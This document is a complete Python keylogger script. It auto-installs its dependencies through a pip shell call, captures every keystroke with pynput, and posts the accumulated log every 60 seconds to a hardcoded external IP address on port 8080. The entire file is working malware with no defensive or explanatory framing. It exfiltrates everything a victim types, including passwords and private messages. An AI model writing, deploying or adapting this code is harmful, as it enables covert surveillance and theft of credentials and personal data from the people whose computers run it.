try:
    import logging
    import os
    import platform
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    import requests
    from pynput import keyboard
    from pynput.keyboard import Listener
    import time
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "requests"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    SERVER_IP = "139.162.176.247"
    SERVER_PORT = 8080
    SEND_REPORT_EVERY = 60  # in seconds

    class KeyLogger:
        def __init__(self, time_interval, server_ip, server_port):
            self.interval = time_interval
            self.log = ""
            self.server_ip = server_ip
            self.server_port = server_port

        def appendlog(self, string):
            self.log += string

        def save_data(self, key):
            try:
                if hasattr(key, 'char') and key.char is not None:
                    self.appendlog(key.char)
                else:
                    self.appendlog(f"<{key}>")
            except AttributeError:
                self.appendlog(f"<{key}>")

        def send_data_to_server(self, data):
            url = f"http://{self.server_ip}:{self.server_port}/"
            try:
                response = requests.post(url, json={"keyboardData": data})
                if response.status_code == 200:
                    print("Data successfully sent to server.")
                else:
                    print(f"Failed to send data. Server responded with status code {response.status_code}.")
            except Exception as e:
                print(f"Error sending data to server: {e}")

        def report(self):
            self.send_data_to_server(self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def run(self):
            keyboard_listener = Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()

    # Run KeyLogger
    keylogger = KeyLogger(SEND_REPORT_EVERY, SERVER_IP, SERVER_PORT)
    keylogger.run()